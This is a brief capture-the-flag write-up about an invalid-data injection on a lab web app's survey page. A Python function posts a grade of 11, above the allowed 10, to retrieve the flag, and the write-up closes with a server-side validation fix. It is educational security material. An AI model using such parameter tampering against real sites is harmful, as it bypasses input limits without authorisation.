# Invalid data injection attack

### Introduction
Invalid data injection attack involves injecting invalid data to the server.

### Procedure
In order to submit invalid data to the survey page, we are going to create a script in python that will send a POST request to the server with a grade greater than 10. Which will return us the flag we are looking for.

### Program
We are going to create a function that will send POST request to the server and will return us the page response.
``` python
def try_authentication():
	encoded_params = urllib.parse.urlencode({ 'page': 'survey' })

	url = 'http://192.168.56.101/?{}'.format(encoded_params)

	data = { 'sujet': '2', 'valeur': '11' }
	headers = { 'Content-Type': "application/x-www-form-urlencoded" }

	response = requests.post(url, data=data, headers=headers)

	return response.text
```

This function will give to subject 2 a grade of 11 which is greater than the allowed value on the website which will return us the flag we are looking for.

### How to fix
In order to fix this issue, the server should verify the value entered in the server side as the values given by the client should never be trusted.